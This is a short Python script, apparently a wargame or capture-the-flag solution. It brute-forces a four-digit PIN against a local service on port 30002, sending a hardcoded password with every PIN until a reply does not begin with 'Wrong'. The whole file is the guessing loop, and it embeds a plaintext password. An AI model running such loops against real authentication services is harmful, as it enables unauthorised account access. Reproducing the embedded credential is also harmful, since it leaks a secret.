import socket

def main():
  host = "localhost"
  port = 30002
  client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  client_socket.connect((host, port))
  passwd = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
  data = client_socket.recv(1024).decode()
  print(data)
  for i in range(10000):
    si = str(i)
    if len(si) < 4:
      si ="0" * (4 - len(si)) + si
    print(si)
    new_passwd = passwd + " " + si + "\n"
    client_socket.send(new_passwd.encode())
    data = client_socket.recv(1024).decode()
    data = data.strip()
    if not data.startswith("Wrong"):
      print(data)
      break
  client_socket.close()

if __name__ == "__main__":
  print("Executing the script...")
  main()



